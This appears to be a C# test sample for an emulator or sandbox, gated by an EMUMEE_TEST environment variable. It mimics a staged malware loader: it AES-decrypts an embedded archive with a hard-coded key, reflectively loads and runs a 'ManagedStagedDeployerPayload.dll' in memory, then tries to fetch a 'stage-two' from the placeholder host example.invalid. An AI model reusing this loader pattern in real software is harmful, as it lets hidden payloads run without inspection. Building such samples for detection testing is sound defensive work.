#pragma warning disable SYSLIB0014
using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;

if (Environment.GetEnvironmentVariable("EMUMEE_TEST") != "virtual")
    return 2;

byte[] key = Convert.FromBase64String("AAECAwQFBgcICQoLDA0ODw==");
byte[] iv = Convert.FromBase64String("EBESExQVFhcYGRobHB0eHw==");
byte[] ciphertext = Convert.FromBase64String(EmbeddedArchive.Base64);
using var aes = Aes.Create();
aes.Key = key;
aes.IV = iv;
byte[] archiveBytes = aes.CreateDecryptor().TransformFinalBlock(ciphertext, 0, ciphertext.Length);

using var source = new MemoryStream(archiveBytes);
using var archive = new ZipArchive(source, ZipArchiveMode.Read, true);
ZipArchiveEntry? selected = null;
foreach (ZipArchiveEntry entry in archive.Entries)
{
    if (entry.FullName == "stage/ManagedStagedDeployerPayload.dll")
        selected = entry;
}
if (selected == null)
    return 3;

using var member = selected.Open();
using var buffer = new MemoryStream();
member.CopyTo(buffer);
byte[] stageBytes = buffer.ToArray();
Assembly loaded = Assembly.Load(stageBytes);
loaded.GetType("DeployerStage.Stage")!.GetMethod("Run")!.Invoke(null, null);

// Attempt an offline request after the stage. No payload or host data is sent.
try
{
    var client = new WebClient();
    client.DownloadString("https://example.invalid/emumee-stage-two");
    return 1;
}
catch (WebException)
{
    return 0;
}
